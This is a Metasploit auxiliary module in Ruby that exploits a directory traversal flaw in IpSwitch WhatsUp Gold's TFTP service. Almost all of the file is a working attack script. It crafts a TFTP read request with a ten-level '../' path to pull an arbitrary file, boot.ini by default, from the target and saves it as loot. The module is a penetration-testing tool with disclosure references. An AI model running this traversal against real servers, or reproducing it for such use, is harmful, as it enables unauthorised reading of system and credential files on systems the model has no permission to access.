##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Auxiliary

	include Msf::Auxiliary::Scanner
	include Msf::Auxiliary::Report

	def initialize(info={})
		super(update_info(info,
			'Name'           => "IpSwitch WhatsUp Gold TFTP Directory Traversal",
			'Description'    => %q{
					This modules exploits a directory traversal vulnerability in IpSwitch WhatsUp
				Gold's TFTP service.
			},
			'License'        => MSF_LICENSE,
			'Author'         =>
				[
					'Prabhu S Angadi',  #Initial discovery and poc
					'sinn3r'            #Metasploit
				],
			'References'     =>
				[
					['URL', 'http://www.exploit-db.com/exploits/18189/'],
					['URL', 'http://secpod.org/advisories/SecPod_Ipswitch_TFTP_Server_Dir_Trav.txt']
				],
			'DisclosureDate' => "Dec 12 2011"
		))

		register_options(
			[
				Opt::RPORT(69),
				OptString.new('FILENAME', [false, 'The file to loot', 'boot.ini']),
				OptBool.new('SAVE', [false, 'Save the downloaded file to disk', 'false'])
			], self.class)
	end

	def run_host(ip)
		# Prepare the filename
		file_name  = "../"*10
		file_name << datastore['FILENAME']

		# Prepare the packet
		pkt = "\x00\x01"
		pkt << file_name
		pkt << "\x00"
		pkt << "octet"
		pkt << "\x00"

		# We need to reuse the same port in order to receive the data
		udp_sock = Rex::Socket::Udp.create(
			{
				'Context' => {'Msf' => framework, 'MsfExploit'=>self}
			}
		)

		add_socket(udp_sock)

		# Send the packet to target
		udp_sock.sendto(pkt, ip, datastore['RPORT'])

		res = udp_sock.get(65535)
		res = res[4, res.length]
		udp_sock.close

		# Output file if verbose
		vprint_line(res.to_s)

		# Save file to disk
		path = store_loot(
			'whatsupgold.tftp',
			'application/octet-stream',
			ip,
			res,
			datastore['FILENAME']
		)

		print_status("File saved in: #{path}")
	end
end

=begin
Remote code execution might be unlikely with this directory traversal bug, because WRITE
requests are forbidden by default, and cannot be changed.
=end